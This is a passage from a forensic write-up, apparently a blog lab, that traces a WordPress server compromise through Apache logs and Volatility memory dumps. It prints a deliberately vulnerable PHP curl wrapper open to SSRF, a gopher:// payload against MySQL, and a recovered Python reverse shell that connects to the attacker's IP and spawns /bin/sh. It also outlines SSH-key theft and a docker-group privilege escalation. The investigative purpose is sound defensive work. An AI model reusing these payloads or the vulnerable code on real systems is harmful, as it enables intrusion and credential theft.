192.168.122.158 - - [27/Dec/2018:19:50:43 +0100] "GET /test.php HTTP/1.1" 200 415 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:50:43 +0100] "GET /favicon.ico HTTP/1.1" 404 506 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:50:51 +0100] "POST /test.php HTTP/1.1" 200 445 "http://192.168.122.216/test.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:50:51 +0100] "GET /favicon.ico HTTP/1.1" 404 506 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:51:00 +0100] "POST /test.php HTTP/1.1" 200 437 "http://192.168.122.216/test.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:51:00 +0100] "GET /favicon.ico HTTP/1.1" 404 506 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:51:07 +0100] "POST /test.php HTTP/1.1" 200 442 "http://192.168.122.216/test.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:51:07 +0100] "GET /favicon.ico HTTP/1.1" 404 506 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:51:17 +0100] "POST /test.php HTTP/1.1" 200 447 "http://192.168.122.216/test.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:51:17 +0100] "GET /favicon.ico HTTP/1.1" 404 506 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:51:32 +0100] "POST /test.php HTTP/1.1" 200 600 "http://192.168.122.216/test.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:51:32 +0100] "GET /favicon.ico HTTP/1.1" 404 506 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:51:40 +0100] "POST /test.php HTTP/1.1" 200 443 "http://192.168.122.216/test.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:51:40 +0100] "GET /favicon.ico HTTP/1.1" 404 506 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:51:53 +0100] "POST /test.php HTTP/1.1" 200 437 "http://192.168.122.216/test.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:51:54 +0100] "GET /favicon.ico HTTP/1.1" 404 506 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:57:32 +0100] "POST /test.php HTTP/1.1" 200 434 "http://192.168.122.216/test.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:57:32 +0100] "GET /favicon.ico HTTP/1.1" 404 506 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:57:38 +0100] "POST /test.php HTTP/1.1" 200 2076 "http://192.168.122.216/test.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:57:38 +0100] "GET /favicon.ico HTTP/1.1" 404 506 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:58:39 +0100] "GET / HTTP/1.0" 200 17847 "-" "-"
--
192.168.122.158 - - [27/Dec/2018:19:58:58 +0100] "POST /test.php HTTP/1.1" 200 927 "http://192.168.122.216/test.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:58:58 +0100] "GET /favicon.ico HTTP/1.1" 404 506 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:20:52:48 +0100] "GET /wp-admin/ HTTP/1.1" 302 410 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:20:52:49 +0100] "GET /wp-login.php?redirect_to=http%3A%2F%2F192.168.122.216%2Fwp-admin%2F&reauth=1 HTTP/1.1" 200 3608 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:20:52:49 +0100] "GET /wp-includes/css/dashicons.min.css?ver=5.0.2 HTTP/1.1" 200 28983 "http://192.168.122.216/wp-login.php?redirect_to=http%3A%2F%2F192.168.122.216%2Fwp-admin%2F&reauth=1" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
```

Monique must found something on her last request because she decided to go on WordPress admin panel: `wp-admin`. She probably discovered something that allowed her to log on as __eddiethehead__.

However, we need to stay focus on our task: finding the entry point. The attacker requested many time `test.php` web page before logging in. She must have exploit something at `19:58:58`.

Here are `test.php` and `config_test.php` web pages:

```bash
webserver $ cat /var/www/html/test.php
<?php 
include_once "config_test.php";
?>

<html>
<head>
	<title>Super curling</title>
</head>
<body>
	<form action="test.php" method="post">
		URL Checker - Beta: 
		<input type="text" name='url' />		
	</form>
<?php
if (isset($_POST['url'])&&!empty($_POST['url']))
{
	$url = $_POST['url'];
	$content_url = getUrlContent($url);
}
else
{
	$content_url = "";
}

if(isset($_GET['debug']))
{
	show_source(__FILE__);
}
?> 
</body>
</html>

webserver $ cat /var/www/html/config_test.php
<?php
function safe($url)
{
	$tmpurl = parse_url($url, PHP_URL_HOST);
	if($tmpurl != "localhost" and $tmpurl != "127.0.0.1")
	{
		var_dump($tmpurl);
		die("<h1>Only access to localhost</h1>");
	}
	return $url;
}

function getUrlContent($url){
	$url = safe($url);
	$url = escapeshellarg($url);
	$pl = "curl -v ".$url;
	echo $pl;
	$content = shell_exec($pl);
	echo $content;
	return $content;
}
?>
```

So this page makes a poor curl on a page located in the localhost (127.0.0.1). Odie told me it was for a course project or something, whatever. He probably got fucked because of this project


![](/lib/images/articles/realgsmoveinsilencelikelasagna/blue_5.gif)


We have found several interesting websites:

> https://www.dailysecurity.fr/server-side-request-forgery/

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

On Geluchat website, Odie sees things about `file://` and `gopher://` stuff. Odie is an ethical person and his school too. ENSIBS teach only cyberdefense stuff, not offensive security, it's not CDAISI. Nevertheless, he decided to search into the memory these artifacts. Sometimes we need some luck:

```bash
$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_yarascan -Y "file://" > yarascan_file
$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_yarascan -Y "gopher://" > yarascan_gopher
$ cat yarascan_file | wc -l               
884
$ cat yarascan_gopher| wc -l
17
```

No more stupid than anyone else, I prefer to start with the smallest file:

```bash
$ cat yarascan_gopher       
Task: apache2 pid 21463 rule r1 addr 0x7f072b473019
0x7f072b473019  67 6f 70 68 65 72 3a 2f 2f 31 32 37 2e 30 2e 30   gopher://127.0.0
0x7f072b473029  2e 31 3a 33 33 30 36 2f 5f 25 61 63 25 30 30 25   .1:3306/_%ac%00%
0x7f072b473039  30 30 25 30 31 25 38 35 25 61 32 25 33 66 25 30   00%01%85%a2%3f%0
0x7f072b473049  30 25 30 30 25 30 30 25 30 30 25 30 31 25 32 31   0%00%00%00%01%21
0x7f072b473059  25 30 30 25 30 30 25 30 30 25 30 30 25 30 30 25   %00%00%00%00%00%
0x7f072b473069  30 30 25 30 30 25 30 30 25 30 30 25 30 30 25 30   00%00%00%00%00%0
0x7f072b473079  30 25 30 30 25 30 30 00 33 47 2b 07 7f 00 00 03   0%00%00.3G+.....
0x7f072b473089  00 00 00 ff ff ff ff ff ff ff ff 05 00 00 00 09   ................
0x7f072b473099  00 00 00 ff ff ff ff 01 00 00 00 ff ff ff ff 08   ................
0x7f072b4730a9  00 00 00 04 00 00 00 06 00 00 00 ff ff ff ff ff   ................
0x7f072b4730b9  ff ff ff 00 00 00 00 f8 90 52 2b 07 7f 00 00 11   .........R+.....
0x7f072b4730c9  00 00 00 ff ff ff ff 6f f0 0a bf b7 d0 00 80 58   .......o.......X
0x7f072b4730d9  46 fc 23 07 7f 00 00 18 91 52 2b 07 7f 00 00 11   F.#......R+.....
0x7f072b4730e9  00 00 00 ff ff ff ff b8 c3 45 9c e2 8b ac be 58   .........E.....X
0x7f072b4730f9  69 fd 23 07 7f 00 00 80 33 47 2b 07 7f 00 00 07   i.#.....3G+.....
0x7f072b473109  00 00 00 0a 00 00 00 01 00 00 00 ff ff ff ff 0b   ................
```

And here is the magic trick:

> gopher://127.0.0.1:3306/\_%ac%00%00%01%85%a2%3f%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00


![](https://media.giphy.com/media/12NUbkX6p4xOO4/giphy.gif)


Decoding this data is not really useful... Some non-printable bytes. Let's extract the memory of the PID `21463` and fitler on `%[0-9]{2}`:

```bash
$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_dump_map -s 0x00007f072b400000 -p 21463 -D .
$ strings ./task.21463.0x7f072b400000.vma | grep -E "%[0-9]{2}"
69%6f%6e%070
%00%
9%62
70%61
d%20%77%P
'gopher://127.0.0.1:3306/_%ac%00%00%01%85%a2%3f%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00
%62%2e%77%70%5f%75%73%65%72%73%01%00%00%00%01'
%10gT+

$ echo -n "%69%6f%6e%07%62%70%61%20%77%%ac%00%00%01%85%a2%3f%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%62%2e%77%70%5f%75%73%65%72%73%01%00%00%00%01%10" | tr -d "%" | xxd -r -p
ionbpa w���?!b.wp_users
```

Odie finds the string `b.wp_users`. In WordPress world, `wp_users` is the MySQL table where user informations are stored. By user informations, I mean username, hashed password and so on.

I think we found the entry point: Monique exploited an SSRF and get WordPress credentials stored in the MySQL database.

### Reverse shell

Knowing the entry point (`test.php`) makes easier to understand why Monique rushed to the WordPress administration page (`wp-admin`):

```bash
webserver $ cat access.log | grep 158 | grep -A 4 test.php | grep -v -E "DirBuster|Nmap"
[...]
192.168.122.158 - - [27/Dec/2018:19:58:58 +0100] "POST /test.php HTTP/1.1" 200 927 "http://192.168.122.216/test.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:58:58 +0100] "GET /favicon.ico HTTP/1.1" 404 506 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:20:52:48 +0100] "GET /wp-admin/ HTTP/1.1" 302 410 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:20:52:49 +0100] "GET /wp-login.php?redirect_to=http%3A%2F%2F192.168.122.216%2Fwp-admin%2F&reauth=1 HTTP/1.1" 200 3608 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:20:52:49 +0100] "GET /wp-includes/css/dashicons.min.css?ver=5.0.2 HTTP/1.1" 200 28983 "http://192.168.122.216/wp-login.php?redirect_to=http%3A%2F%2F192.168.122.216%2Fwp-admin%2F&reauth=1" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
```

Since there is only one user on the website (__eddiethehead__), it's not really hard to guess with which account Monique logged in. Going down a little bit in the log file, something caught my attention:

```bash
webserver $ cat access.log | less -N
[...]
   2778 192.168.122.158 - - [27/Dec/2018:20:53:18 +0100] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 431 "http://192.168.122.216/wp-admin/theme-editor.php" "Mozilla/5.0 (X   2778 11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
   2779 ::1 - - [27/Dec/2018:20:53:24 +0100] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.25 (Debian) (internal dummy connection)"
   2780 192.168.122.158 - - [27/Dec/2018:20:53:25 +0100] "GET /wp-admin/theme-editor.php?file=inc%2Fcustomizer.php&theme=rock-band HTTP/1.1" 200 11888 "http://192.168.122.2   2780 16/wp-admin/theme-editor.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
[...]
```

The web page `theme-editor`, its name is explicit. With Odie we wonder why Monique edited the WordPress theme. She doesn't like Iron Maiden?

Odie followed the URL found in the log:

> http://192.168.122.216/wp-admin/theme-editor.php?file=inc%2Fcustomizer.php&theme=rock-band

 
![](/lib/images/articles/realgsmoveinsilencelikelasagna/blue_4.png)


At the very first view, nothing really awful over there. But Monique edited a PHP web page: `customizer.php`. We can hypothesize that the evil hacker injects arbitrary PHP code in this page in order to get access on the Debian server. 

Unfortunately, Monique removed her arbitrary code before leaving, so no proof... Even in the memory dump, there doesn't seem to be much:

```bash
$ cat pfile_list| grep "rock-band"     
----------------                0x0 /bin/bin/var/www/html/wp-content/languages/themes/rock-band-fr_FR.mo
          532630 0xffff979692ed5948 /bin/bin/var/www/html/wp-content/themes/rock-band
          532646 0xffff979692ef9a88 /bin/bin/var/www/html/wp-content/themes/rock-band/functions.php
          532639 0xffff979692ef41a8 /bin/bin/var/www/html/wp-content/themes/rock-band/inc
----------------                0x0 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/customizer.php~
----------------                0x0 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/ensibssecretproject
----------------                0x0 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/ens
          532643 0xffff979692ef5a48 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/override-parent.php
          532640 0xffff979692ef45d8 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/metabox
          532641 0xffff979692ef4a08 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/metabox/metabox.php
          532631 0xffff979692ed50e8 /bin/bin/var/www/html/wp-content/themes/rock-band/languages
----------------                0x0 /bin/bin/var/www/html/wp-content/themes/rock-band/languages/fr_FR.mo
```

I can still see this:

* customizer.php~
* ensibssecretproject

The first file is follow by the `~` suffix, probably for temporary files. If we would manage to recover this file, we probably could get the arbitrary code.

The second one, is an ENSIBS project of Odie, finding this file in this place is quite surprising.

Let's look for `customizer.php` string in memory, with the yarascan plugin from Volatility and see where it appears:

```bash
$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_yarascan -Y "customizer.php"
[...]
Task: apache2 pid 21733 rule r1 addr 0x7f0733fb39b7
0x7f0733fb39b7  63 75 73 74 6f 6d 69 7a 65 72 2e 70 68 70 3f 78   customizer.php?x
0x7f0733fb39c7  3d 70 79 74 68 6f 6e 25 32 30 2d 63 25 32 30 25   =python%20-c%20%
0x7f0733fb39d7  32 37 69 6d 70 6f 72 74 25 32 30 73 6f 63 6b 65   27import%20socke
0x7f0733fb39e7  74 2c 73 75 62 70 72 6f 63 65 73 73 2c 6f 73 3b   t,subprocess,os;
0x7f0733fb39f7  73 3d 73 6f 63 6b 65 74 2e 73 6f 63 6b 65 74 28   s=socket.socket(
0x7f0733fb3a07  73 6f 63 6b 65 74 2e 41 46 5f 49 4e 45 54 2c 73   socket.AF_INET,s
0x7f0733fb3a17  6f 63 6b 65 74 2e 53 4f 43 4b 5f 53 54 52 45 41   ocket.SOCK_STREA
0x7f0733fb3a27  4d 29 3b 73 2e 63 6f 6e 6e 65 63 74 28 28 25 32   M);s.connect((%2
0x7f0733fb3a37  32 31 39 32 2e 31 36 38 2e 31 32 32 2e 31 35 38   2192.168.122.158
0x7f0733fb3a47  25 32 32 2c 33 36 31 35 29 29 3b 6f 73 2e 64 75   %22,3615));os.du
0x7f0733fb3a57  70 32 28 73 2e 66 69 6c 65 6e 6f 28 29 2c 30 29   p2(s.fileno(),0)
0x7f0733fb3a67  3b 25 32 30 6f 73 2e 64 75 70 32 28 73 2e 66 69   ;%20os.dup2(s.fi
0x7f0733fb3a77  6c 65 6e 6f 28 29 2c 31 29 3b 25 32 30 6f 73 2e   leno(),1);%20os.
0x7f0733fb3a87  64 75 70 32 28 73 2e 66 69 6c 65 6e 6f 28 29 2c   dup2(s.fileno(),
0x7f0733fb3a97  32 29 3b 70 3d 73 75 62 70 72 6f 63 65 73 73 2e   2);p=subprocess.
0x7f0733fb3aa7  63 61 6c 6c 28 5b 25 32 32 2f 62 69 6e 2f 73 68   call([%22/bin/sh
[...]
```

We can notice something really strange, it could be dangerous:

```bash
$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_proc_maps -p 21733 > papache_customizerphp
$ cat papache_customizerphp| grep 7f0733fb        
0xffff9796baa41000    21733 apache2              0x00007f0733fae000 0x00007f0733fb4000 rw-                   0x0      0      0          0 
0xffff9796baa41000    21733 apache2              0x00007f0733fb4000 0x00007f0733fc4000 rwx                   0x0      0      0          0 
$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_dump_map -s 0x00007f0733fae000 -p 21733 -D .
Volatility Foundation Volatility Framework 2.6.1
Task       VM Start           VM End                         Length Path
---------- ------------------ ------------------ ------------------ ----
     21733 0x00007f0733fae000 0x00007f0733fb4000             0x6000 ./task.21733.0x7f0733fae000.vma
$ strings ./task.21733.0x7f0733fae000.vma | grep customizer.php
band/inc/customizer.php47
51%\GET /wp-content/themes/rock-band/inc/customizer.php?x=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.122.158%22,3615));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1
192.168.122.158 - - [27/Dec/2018:21:08:21 +0100] "GET /wp-content/themes/rock-band/inc/customizer.php?x=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.122.158%22,3615));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1" 500 185 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
```

After URL decoding the data (thanks CyberChef), beautify the python code, it looks to:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.122.158",3615))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

The code is explicit, it gives an interactive `/bin/sh` to the suspicious IP address (IP owns by Monique) through a network socket on TCP port 3615. I think we found the arbitrary code injected: command execution in PHP.

### Privilege escalation

We are starting to get a good look on actions made by Monique. However, there is something strange, what happened between the reverse shell and the backdoor? 

Monique got an access as __www-data__, not as __root__. She must be doing at least one privilege escalation.

In fact, we could stop the investigation here. We know where the backdoor is, we know where is the entry point. In principle, if we correct these issues, Monique will no longer be able to get access to the Odie's VPS. But we're here to learn things and have fun! Then let's going further!

#### www-data to odie

As we know, __www-data__ got shell access the `27/12/2018 at 21:08:21`. In `auth.log` file, recovered from memory, we can see 10 minutes later an SSH connection using the Odie public key:

```bash
$ cat auth.log | grep -a '21:1' 
[...]
Dec 27 21:17:09 webserver sshd[21876]: Accepted publickey for odie from 192.168.122.158 port 36436 ssh2: RSA SHA256:ewpGYcEucLCF/HglzVKufdAi1091iowCPAA95g2tDxA
[...]
```

I assume Odie's private key was stolen by Monique. She did at least two privilege escalation:

> www-data -> odie ; odie -> root

The first privilege escalation will be hard to find because __www-data__ doesn't have `.bash_history` files or other kinds of commands history. But, __odie__ has his bash history, let's try to find out something useful:

```bash
$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_bash
[...]
     419 bash                 2018-12-27 18:31:58 UTC+0000   vim wrapper.c
     419 bash                 2018-12-27 18:32:20 UTC+0000   gcc wrapper.c -o ensibssecretproject
     419 bash                 2018-12-27 18:32:26 UTC+0000   chmod 6775 ensibssecretproject 
     419 bash                 2018-12-27 18:32:29 UTC+0000   ./ensibssecretproject 
[...]
```

Odie has put a sticky bit on a binary, it may be a good lead to start digging.

```bash
$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_yarascan -Y "ensibssecretproject" > yarascan_ensibssecretproject
$ strings ./task.419.0x1598000.vma | grep ensibs      
chmod 6775 ensibssecretproject 
mv ensibssecretproject /usr/local/bin/
sudo mv ensibssecretproject /usr/local/bin/
gcc wrapper.c -o ensibssecretproject
./ensibssecretproject 
ls -la /usr/local/bin/ensibssecretproject
```

Nothing unusual. Maybe a wrong lead? 

#### odie to root

The second privilege escalation will be easier to find! Let's take a look at running processes:

```bash
$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_psaux > plinux_psaux
$ cat plinux_psaux | grep "0      0" | grep -v '\['
1      0      0      /sbin/init                                                      
193    0      0      /lib/systemd/systemd-journald                                   
216    0      0      /lib/systemd/systemd-udevd                                      
324    0      0      /usr/sbin/rsyslogd -n                                           
343    0      0      /usr/sbin/cron -f                                               
344    0      0      /lib/systemd/systemd-logind                                     
371    0      0      /sbin/agetty --noclear tty1 linux                               
374    0      0      /usr/sbin/sshd -D                                               
393    0      0      /sbin/dhclient -4 -v -pf /run/dhclient.enp1s0.pid -lf /var/lib/dhcp/dhclient.enp1s0.leases -I -df /var/lib/dhcp/dhclient6.enp1s0.leases enp1s0
14659  0      0      /usr/lib/packagekit/packagekitd                                 
14670  0      0      /usr/lib/policykit-1/polkitd --no-debug                         
16169  0      0      /usr/bin/containerd                                             
16290  0      0      /usr/bin/dockerd -H unix://                                     
21462  0      0      /usr/sbin/apache2 -k start                                      
22347  0      0      sudo su                                                         
22348  0      0      su                                                              
22349  0      0      bash                                                            
22887  0      0      sudo insmod lime-4.9.0-8-amd64.ko path=/home/odie/memory.dmp format=lime timeout=0
22888  0      0      insmod lime-4.9.0-8-amd64.ko path=/home/odie/memory.dmp format=lime timeout=0
```

The __odie__ user is in the group of only two processes:

```bash
webserver $ id
uid=1000(odie) gid=1000(odie) groupes=1000(odie),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)
```

* sudo
* docker

Sudoers rights got default configuration, then you need the __odie__ password to run commands as root. The attacker wouldn't managed to gain __root__ access from `sudo`. It remains `docker`.

The privilege escalation happened after `21:17:09`, it's the time of SSH key connection of Monique with the __odie__ account: 

```bash
$ cat auth.log | grep -a '21:1' 
[...]
Dec 27 21:17:09 webserver sshd[21876]: Accepted publickey for odie from 192.168.122.158 port 36436 ssh2: RSA SHA256:ewpGYcEucLCF/HglzVKufdAi1091iowCPAA95g2tDxA
[...]
$ cat daemon.log | grep -a "21:" | grep -E "docker|container"
Dec 27 21:25:11 webserver dockerd[16290]: time="2018-12-27T21:25:11.184923869+01:00" level=error msg="Download failed, retrying: unexpected EOF"
Dec 27 21:26:34 webserver dockerd[16290]: time="2018-12-27T21:26:34.788383276+01:00" level=error msg="Not continuing with pull after error: context canceled"
Dec 27 21:35:33 webserver containerd[16169]: time="2018-12-27T21:35:33.625364744+01:00" level=info msg="shim containerd-shim started" address="/containerd-shim/moby/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/shim.sock" debug=false pid=22019
Dec 27 21:38:06 webserver containerd[16169]: time="2018-12-27T21:38:06.441456597+01:00" level=info msg="shim reaped" id=7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d
Dec 27 21:38:06 webserver dockerd[16290]: time="2018-12-27T21:38:06.452409767+01:00" level=info msg="ignoring event" module=libcontainerd namespace=moby topic=/tasks/delete type="*events.TaskDelete"
```

A container has been created at `21:35:33` which is identified with:

> 7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d

It's possible to retrieve this docker's configuration:

```bash
$ cat pfile_list| grep "7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d"
          541342 0xffff9796a94451a8 /bin/bin/var/lib/docker/image/overlay2/layerdb/mounts/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d
          541345 0xffff9796a94471e8 /bin/bin/var/lib/docker/image/overlay2/layerdb/mounts/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/parent
          541344 0xffff9796a94455d8 /bin/bin/var/lib/docker/image/overlay2/layerdb/mounts/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/init-id
          541343 0xffff9796a9445a08 /bin/bin/var/lib/docker/image/overlay2/layerdb/mounts/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/mount-id
          541346 0xffff9796a9447a48 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d
          541348 0xffff9796439e5798 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/config.v2.json
          541349 0xffff9796a9448a88 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/hostconfig.json
          541358 0xffff979686544328 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-json.log
          541356 0xffff9796a9456698 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/mounts
----------------                0x0 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/mounts/secrets
          541357 0xffff9796a9456268 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/mounts/shm
          541352 0xffff9796a9448658 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/hostname
          541355 0xffff9796a9448228 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/resolv.conf.hash
          541353 0xffff979643985b48 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/resolv.conf
          541351 0xffff9796a94c87d8 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/hosts
          541347 0xffff9796a9447618 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/checkpoints
----------------                0x0 /bin/bin/var/lib/containerd/io.containerd.runtime.v1.linux/moby/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d
----------------                0x0 /bin/bin/usr/lib/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts.mount
----------------                0x0 /bin/bin/usr/lib/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d.mount
----------------                0x0 /bin/bin/usr/lib/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount.d
